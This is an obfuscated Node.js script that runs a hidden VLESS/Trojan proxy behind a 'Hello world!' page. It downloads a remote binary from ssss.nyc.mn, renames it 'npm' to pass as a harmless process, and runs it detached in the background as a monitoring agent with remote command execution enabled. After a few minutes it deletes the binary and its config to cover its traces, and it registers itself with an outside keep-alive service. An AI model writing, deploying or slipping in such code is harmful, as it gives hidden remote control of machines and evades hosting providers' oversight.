const _0x5c18b1=_0x359d;(function(_0x16e9f6,_0x55f9cc){const _0x7bb507=_0x359d,_0x492e8d=_0x16e9f6();while(!![]){try{const _0x24a472=-parseInt(_0x7bb507(0x21c))/0x1+-parseInt(_0x7bb507(0x1f5))/0x2+-parseInt(_0x7bb507(0x1e7))/0x3*(-parseInt(_0x7bb507(0x208))/0x4)+parseInt(_0x7bb507(0x1f9))/0x5*(parseInt(_0x7bb507(0x20c))/0x6)+parseInt(_0x7bb507(0x200))/0x7+-parseInt(_0x7bb507(0x226))/0x8+parseInt(_0x7bb507(0x243))/0x9;if(_0x24a472===_0x55f9cc)break;else _0x492e8d['push'](_0x492e8d['shift']());}catch(_0x46d608){_0x492e8d['push'](_0x492e8d['shift']());}}}(_0xcb8f,0x79e2e));function _0x359d(_0x2c9f6a,_0x5c3e29){_0x2c9f6a=_0x2c9f6a-0x1c4;const _0xcb8f27=_0xcb8f();let _0x359d29=_0xcb8f27[_0x2c9f6a];return _0x359d29;}const os=require('os'),http=require(_0x5c18b1(0x218)),fs=require('fs'),axios=require(_0x5c18b1(0x1e1)),net=require(_0x5c18b1(0x1fd)),path=require('path'),crypto=require(_0x5c18b1(0x235)),{Buffer}=require(_0x5c18b1(0x1cf)),{exec,execSync}=require(_0x5c18b1(0x1e6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x5c18b1(0x202)]||_0x5c18b1(0x1fe),NEZHA_SERVER=process['env'][_0x5c18b1(0x22c)]||'',NEZHA_PORT=process[_0x5c18b1(0x231)][_0x5c18b1(0x212)]||'',NEZHA_KEY=process[_0x5c18b1(0x231)][_0x5c18b1(0x224)]||'',DOMAIN=process[_0x5c18b1(0x231)][_0x5c18b1(0x1e8)]||_0x5c18b1(0x1cc),AUTO_ACCESS=process[_0x5c18b1(0x231)]['AUTO_ACCESS']||!![],WSPATH=process[_0x5c18b1(0x231)][_0x5c18b1(0x1eb)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x5c18b1(0x231)][_0x5c18b1(0x21f)]||_0x5c18b1(0x1de),NAME=process[_0x5c18b1(0x231)][_0x5c18b1(0x210)]||'',PORT=process['env'][_0x5c18b1(0x203)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x258b12=_0x5c18b1;try{const _0x455580=await axios[_0x258b12(0x23a)](_0x258b12(0x20a)),_0x4f553a=_0x455580[_0x258b12(0x1f7)];ISP=(_0x4f553a[_0x258b12(0x223)]+'-'+_0x4f553a[_0x258b12(0x1d8)])[_0x258b12(0x214)](/ /g,'_');}catch(_0x885a3b){ISP=_0x258b12(0x1c4);}};GetISP();const httpServer=http['createServer']((_0x30defd,_0x2014e1)=>{const _0x467bed=_0x5c18b1;if(_0x30defd[_0x467bed(0x1e9)]==='/'){const _0x4840ed=path[_0x467bed(0x1d5)](__dirname,_0x467bed(0x20f));fs[_0x467bed(0x1d2)](_0x4840ed,_0x467bed(0x241),(_0x2caecc,_0x74f0c1)=>{const _0x4eda1f=_0x467bed;if(_0x2caecc){_0x2014e1[_0x4eda1f(0x1ca)](0xc8,{'Content-Type':_0x4eda1f(0x21e)}),_0x2014e1['end'](_0x4eda1f(0x1f8));return;}_0x2014e1[_0x4eda1f(0x1ca)](0xc8,{'Content-Type':'text/html'}),_0x2014e1[_0x4eda1f(0x1dd)](_0x74f0c1);});return;}else{if(_0x30defd[_0x467bed(0x1e9)]==='/'+SUB_PATH){const _0x24b1fa=NAME?NAME+'-'+ISP:ISP,_0x435b8d='vless://'+UUID+'@'+DOMAIN+_0x467bed(0x1e2)+DOMAIN+_0x467bed(0x1ce)+DOMAIN+_0x467bed(0x238)+WSPATH+'#'+_0x24b1fa,_0x367a4e='trojan://'+UUID+'@'+DOMAIN+_0x467bed(0x1f6)+DOMAIN+_0x467bed(0x1ce)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x24b1fa,_0x4d0dbf=_0x435b8d+'\x0a'+_0x367a4e,_0x3a9ae8=Buffer[_0x467bed(0x1df)](_0x4d0dbf)[_0x467bed(0x237)](_0x467bed(0x23b));_0x2014e1[_0x467bed(0x1ca)](0xc8,{'Content-Type':_0x467bed(0x1ee)}),_0x2014e1[_0x467bed(0x1dd)](_0x3a9ae8+'\x0a');}else _0x2014e1[_0x467bed(0x1ca)](0x194,{'Content-Type':_0x467bed(0x1ee)}),_0x2014e1[_0x467bed(0x1dd)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5c18b1(0x214)](/-/g,''),DNS_SERVERS=[_0x5c18b1(0x227),_0x5c18b1(0x1f2)];function resolveHost(_0x8aa015){return new Promise((_0x1f687e,_0x6d6d19)=>{const _0x2ff746=_0x359d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2ff746(0x1da)](_0x8aa015)){_0x1f687e(_0x8aa015);return;}let _0x2a28c8=0x0;function _0xba6b80(){const _0x553a05=_0x2ff746;if(_0x2a28c8>=DNS_SERVERS[_0x553a05(0x232)]){_0x6d6d19(new Error(_0x553a05(0x23f)+_0x8aa015+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4a65c0=DNS_SERVERS[_0x2a28c8];_0x2a28c8++;const _0x48bc1b=_0x553a05(0x222)+encodeURIComponent(_0x8aa015)+_0x553a05(0x22a);axios['get'](_0x48bc1b,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x553a05(0x1d3)](_0x5d1ce5=>{const _0x1be4db=_0x553a05,_0x4a9ae7=_0x5d1ce5['data'];if(_0x4a9ae7['Status']===0x0&&_0x4a9ae7[_0x1be4db(0x1db)]&&_0x4a9ae7[_0x1be4db(0x1db)]['length']>0x0){const _0x237f93=_0x4a9ae7[_0x1be4db(0x1db)][_0x1be4db(0x217)](_0x5c3832=>_0x5c3832[_0x1be4db(0x23c)]===0x1);if(_0x237f93){_0x1f687e(_0x237f93[_0x1be4db(0x1f7)]);return;}}_0xba6b80();})[_0x553a05(0x1ec)](_0x57d489=>{_0xba6b80();});}_0xba6b80();});}function handleVlessConnection(_0x498b3e,_0x494f28){const _0x49e41d=_0x5c18b1,[_0x4c7deb]=_0x494f28,_0x1a4424=_0x494f28['slice'](0x1,0x11);if(!_0x1a4424[_0x49e41d(0x22b)]((_0x4b680f,_0x55c161)=>_0x4b680f==parseInt(uuid['substr'](_0x55c161*0x2,0x2),0x10)))return![];let _0x42db5a=_0x494f28['slice'](0x11,0x12)[_0x49e41d(0x1f4)]()+0x13;const _0x365b06=_0x494f28['slice'](_0x42db5a,_0x42db5a+=0x2)[_0x49e41d(0x1d0)](0x0),_0x56c6d2=_0x494f28[_0x49e41d(0x205)](_0x42db5a,_0x42db5a+=0x1)[_0x49e41d(0x1f4)](),_0x210c1d=_0x56c6d2==0x1?_0x494f28[_0x49e41d(0x205)](_0x42db5a,_0x42db5a+=0x4)[_0x49e41d(0x1d5)]('.'):_0x56c6d2==0x2?new TextDecoder()['decode'](_0x494f28[_0x49e41d(0x205)](_0x42db5a+0x1,_0x42db5a+=0x1+_0x494f28[_0x49e41d(0x205)](_0x42db5a,_0x42db5a+0x1)[_0x49e41d(0x1f4)]())):_0x56c6d2==0x3?_0x494f28['slice'](_0x42db5a,_0x42db5a+=0x10)[_0x49e41d(0x234)]((_0x59edce,_0x1030d3,_0x3d362a,_0x4db312)=>_0x3d362a%0x2?_0x59edce[_0x49e41d(0x1f0)](_0x4db312[_0x49e41d(0x205)](_0x3d362a-0x1,_0x3d362a+0x1)):_0x59edce,[])[_0x49e41d(0x1d9)](_0x50ec9b=>_0x50ec9b['readUInt16BE'](0x0)[_0x49e41d(0x237)](0x10))[_0x49e41d(0x1d5)](':'):'';_0x498b3e[_0x49e41d(0x1fc)](new Uint8Array([_0x4c7deb,0x0]));const _0x160295=createWebSocketStream(_0x498b3e);return resolveHost(_0x210c1d)['then'](_0x148a3b=>{const _0x322557=_0x49e41d;net[_0x322557(0x229)]({'host':_0x148a3b,'port':_0x365b06},function(){const _0xaf471c=_0x322557;this[_0xaf471c(0x22e)](_0x494f28[_0xaf471c(0x205)](_0x42db5a)),_0x160295['on']('error',()=>{})[_0xaf471c(0x1d6)](this)['on'](_0xaf471c(0x1fa),()=>{})[_0xaf471c(0x1d6)](_0x160295);})['on']('error',()=>{});})[_0x49e41d(0x1ec)](_0x226cc1=>{const _0x460f6d=_0x49e41d;net[_0x460f6d(0x229)]({'host':_0x210c1d,'port':_0x365b06},function(){const _0x371ec9=_0x460f6d;this[_0x371ec9(0x22e)](_0x494f28[_0x371ec9(0x205)](_0x42db5a)),_0x160295['on'](_0x371ec9(0x1fa),()=>{})['pipe'](this)['on'](_0x371ec9(0x1fa),()=>{})['pipe'](_0x160295);})['on'](_0x460f6d(0x1fa),()=>{});}),!![];}function handleTrojanConnection(_0x51bec0,_0x40dfe5){const _0x304bc9=_0x5c18b1;try{if(_0x40dfe5[_0x304bc9(0x232)]<0x3a)return![];const _0x4a0055=_0x40dfe5['slice'](0x0,0x38)[_0x304bc9(0x237)](),_0x184fb4=[UUID];let _0x379678=null;for(const _0xcba6e of _0x184fb4){const _0x23b138=crypto[_0x304bc9(0x1ea)](_0x304bc9(0x22f))[_0x304bc9(0x221)](_0xcba6e)[_0x304bc9(0x22d)](_0x304bc9(0x1d1));if(_0x23b138===_0x4a0055){_0x379678=_0xcba6e;break;}}if(!_0x379678)return![];let _0x30fc7d=0x38;_0x40dfe5[_0x30fc7d]===0xd&&_0x40dfe5[_0x30fc7d+0x1]===0xa&&(_0x30fc7d+=0x2);const _0x329cf3=_0x40dfe5[_0x30fc7d];if(_0x329cf3!==0x1)return![];_0x30fc7d+=0x1;const _0x26d702=_0x40dfe5[_0x30fc7d];_0x30fc7d+=0x1;let _0x537f6b,_0x510bab;if(_0x26d702===0x1)_0x537f6b=_0x40dfe5[_0x304bc9(0x205)](_0x30fc7d,_0x30fc7d+0x4)[_0x304bc9(0x1d5)]('.'),_0x30fc7d+=0x4;else{if(_0x26d702===0x3){const _0x56ce99=_0x40dfe5[_0x30fc7d];_0x30fc7d+=0x1,_0x537f6b=_0x40dfe5[_0x304bc9(0x205)](_0x30fc7d,_0x30fc7d+_0x56ce99)[_0x304bc9(0x237)](),_0x30fc7d+=_0x56ce99;}else{if(_0x26d702===0x4)_0x537f6b=_0x40dfe5[_0x304bc9(0x205)](_0x30fc7d,_0x30fc7d+0x10)[_0x304bc9(0x234)]((_0x21d25d,_0x463983,_0x4c57eb,_0x32aa06)=>_0x4c57eb%0x2?_0x21d25d[_0x304bc9(0x1f0)](_0x32aa06[_0x304bc9(0x205)](_0x4c57eb-0x1,_0x4c57eb+0x1)):_0x21d25d,[])[_0x304bc9(0x1d9)](_0x36a489=>_0x36a489[_0x304bc9(0x1d0)](0x0)[_0x304bc9(0x237)](0x10))[_0x304bc9(0x1d5)](':'),_0x30fc7d+=0x10;else return![];}}_0x510bab=_0x40dfe5[_0x304bc9(0x1d0)](_0x30fc7d),_0x30fc7d+=0x2;_0x30fc7d<_0x40dfe5['length']&&_0x40dfe5[_0x30fc7d]===0xd&&_0x40dfe5[_0x30fc7d+0x1]===0xa&&(_0x30fc7d+=0x2);const _0x590acf=createWebSocketStream(_0x51bec0);return resolveHost(_0x537f6b)[_0x304bc9(0x1d3)](_0x58c196=>{const _0x5bdbae=_0x304bc9;net[_0x5bdbae(0x229)]({'host':_0x58c196,'port':_0x510bab},function(){const _0x1b2c3a=_0x5bdbae;_0x30fc7d<_0x40dfe5['length']&&this[_0x1b2c3a(0x22e)](_0x40dfe5[_0x1b2c3a(0x205)](_0x30fc7d)),_0x590acf['on'](_0x1b2c3a(0x1fa),()=>{})[_0x1b2c3a(0x1d6)](this)['on'](_0x1b2c3a(0x1fa),()=>{})[_0x1b2c3a(0x1d6)](_0x590acf);})['on'](_0x5bdbae(0x1fa),()=>{});})[_0x304bc9(0x1ec)](_0x4fc0ad=>{const _0x310e86=_0x304bc9;net[_0x310e86(0x229)]({'host':_0x537f6b,'port':_0x510bab},function(){const _0x21173e=_0x310e86;_0x30fc7d<_0x40dfe5[_0x21173e(0x232)]&&this[_0x21173e(0x22e)](_0x40dfe5[_0x21173e(0x205)](_0x30fc7d)),_0x590acf['on'](_0x21173e(0x1fa),()=>{})[_0x21173e(0x1d6)](this)['on']('error',()=>{})['pipe'](_0x590acf);})['on'](_0x310e86(0x1fa),()=>{});}),!![];}catch(_0x37bbaf){return![];}}wss['on'](_0x5c18b1(0x1ff),(_0x2a20b7,_0x47b4a8)=>{const _0x1280e5=_0x5c18b1,_0x554ae6=_0x47b4a8[_0x1280e5(0x1e9)]||'';_0x2a20b7[_0x1280e5(0x20b)]('message',_0x8382cf=>{const _0x5b7cbc=_0x1280e5;if(_0x8382cf[_0x5b7cbc(0x232)]>0x11&&_0x8382cf[0x0]===0x0){const _0x2c787b=_0x8382cf[_0x5b7cbc(0x205)](0x1,0x11),_0x21c114=_0x2c787b['every']((_0x526879,_0x4d02b8)=>_0x526879==parseInt(uuid['substr'](_0x4d02b8*0x2,0x2),0x10));if(_0x21c114){!handleVlessConnection(_0x2a20b7,_0x8382cf)&&_0x2a20b7['close']();return;}}!handleTrojanConnection(_0x2a20b7,_0x8382cf)&&_0x2a20b7['close']();})['on'](_0x1280e5(0x1fa),()=>{});});const getDownloadUrl=()=>{const _0xb14367=_0x5c18b1,_0x1e11db=os[_0xb14367(0x1c9)]();return _0x1e11db===_0xb14367(0x206)||_0x1e11db===_0xb14367(0x1ef)||_0x1e11db===_0xb14367(0x1d4)?!NEZHA_PORT?_0xb14367(0x1d7):_0xb14367(0x204):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0xb14367(0x1cd);},downloadFile=async()=>{const _0x2246ef=_0x5c18b1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5f20cf=getDownloadUrl(),_0x2dd4e4=await axios({'method':_0x2246ef(0x23a),'url':_0x5f20cf,'responseType':_0x2246ef(0x1cb)}),_0x3e50c1=fs[_0x2246ef(0x20e)](_0x2246ef(0x242));return _0x2dd4e4['data'][_0x2246ef(0x1d6)](_0x3e50c1),new Promise((_0x3bcc66,_0xc859b5)=>{const _0x53d09b=_0x2246ef;_0x3e50c1['on'](_0x53d09b(0x23e),()=>{const _0x11f4fa=_0x53d09b;console[_0x11f4fa(0x1c8)](_0x11f4fa(0x213)),exec(_0x11f4fa(0x230),_0x16e7c0=>{if(_0x16e7c0)_0xc859b5(_0x16e7c0);_0x3bcc66();});}),_0x3e50c1['on'](_0x53d09b(0x1fa),_0xc859b5);});}catch(_0x2a88b6){throw _0x2a88b6;}},runnz=async()=>{const _0x3e438d=_0x5c18b1;try{const _0x1a283f=execSync(_0x3e438d(0x233),{'encoding':_0x3e438d(0x220)});if(_0x1a283f[_0x3e438d(0x1c6)]()!==''){console[_0x3e438d(0x1c8)](_0x3e438d(0x209));return;}}catch(_0x2e2311){}await downloadFile();let _0x40d4af='',_0x14e74c=['443',_0x3e438d(0x21b),'2096',_0x3e438d(0x1e4),_0x3e438d(0x225),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58f627=_0x14e74c[_0x3e438d(0x211)](NEZHA_PORT)?_0x3e438d(0x216):'';_0x40d4af=_0x3e438d(0x219)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3e438d(0x21a)+NEZHA_KEY+'\x20'+_0x58f627+_0x3e438d(0x201);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x217254=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3e438d(0x21d)](':')['pop']():'',_0xa4f416=_0x14e74c[_0x3e438d(0x211)](_0x217254)?_0x3e438d(0x215):_0x3e438d(0x236),_0x13209f=_0x3e438d(0x1dc)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xa4f416+_0x3e438d(0x1c7)+UUID;fs['writeFileSync'](_0x3e438d(0x1ed),_0x13209f);}_0x40d4af=_0x3e438d(0x239);}else{console[_0x3e438d(0x1c8)](_0x3e438d(0x1e3));return;}}try{exec(_0x40d4af,{'shell':'/bin/bash'},_0x3ed95e=>{const _0x3677d3=_0x3e438d;if(_0x3ed95e)console[_0x3677d3(0x1fa)](_0x3677d3(0x207),_0x3ed95e);else console[_0x3677d3(0x1c8)](_0x3677d3(0x1f3));});}catch(_0x3be36c){console['error'](_0x3e438d(0x1f1)+_0x3be36c);}};async function addAccessTask(){const _0xb182ca=_0x5c18b1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3de308=_0xb182ca(0x240)+DOMAIN;try{const _0x25564a=await axios[_0xb182ca(0x1fb)](_0xb182ca(0x20d),{'url':_0x3de308},{'headers':{'Content-Type':_0xb182ca(0x1e0)}});console[_0xb182ca(0x1c8)](_0xb182ca(0x1e5));}catch(_0x4dc840){}}const delFiles=()=>{const _0x1c4e79=_0x5c18b1;fs[_0x1c4e79(0x23d)](_0x1c4e79(0x242),()=>{}),fs[_0x1c4e79(0x23d)](_0x1c4e79(0x1ed),()=>{});};function _0xcb8f(){const _0x4fd0ca=['nofeetbird.tech','https://amd64.ssss.nyc.mn/agent','&fp=chrome&type=ws&host=','buffer','readUInt16BE','hex','readFile','then','aarch64','join','pipe','https://arm64.ssss.nyc.mn/v1','isp','map','test','Answer','client_secret:\x20','end','sub','from','application/json','axios',':443?encryption=none&security=tls&sni=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2087','Automatic\x20Access\x20Task\x20added\x20successfully','child_process','24FPhbXt','DOMAIN','url','createHash','WSPATH','catch','config.yaml','text/plain','arm64','concat','error:\x20','1.1.1.1','npm\x20is\x20running','readUInt8','917742hYUESz',':443?security=tls&sni=','data','Hello\x20world!','10GvyuKs','error','post','send','net','23b15e40-170d-46b3-9649-fb09959f76da','connection','144277qOvbBX','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','UUID','PORT','https://arm64.ssss.nyc.mn/agent','slice','arm','npm\x20running\x20error:','329044KVekLF','npm\x20is\x20already\x20running,\x20skip\x20running...','https://api.ip.sb/geoip','once','2362182AsMbjx','https://oooo.serv00.net/add-url','createWriteStream','index.html','NAME','includes','NEZHA_PORT','npm\x20download\x20successfully','replace','true','--tls','find','http','setsid\x20nohup\x20./npm\x20-s\x20','\x20-p\x20','8443','203067AJOBpT','split','text/html','SUB_PATH','utf-8','update','https://dns.google/resolve?name=','country_code','NEZHA_KEY','2083','3531368kzxatO','8.8.4.4','listen','connect','&type=A','every','NEZHA_SERVER','digest','write','sha224','chmod\x20+x\x20npm','env','length','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','reduce','crypto','false','toString','&path=%2F','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','get','base64','type','unlink','finish','Failed\x20to\x20resolve\x20','https://','utf8','npm','1228608gJmoVT','Unknown','Server\x20is\x20running\x20on\x20port\x20','trim','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','log','arch','writeHead','stream'];_0xcb8f=function(){return _0x4fd0ca;};return _0xcb8f();}httpServer[_0x5c18b1(0x228)](PORT,()=>{const _0x5806b6=_0x5c18b1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5806b6(0x1c8)](_0x5806b6(0x1c5)+PORT);});
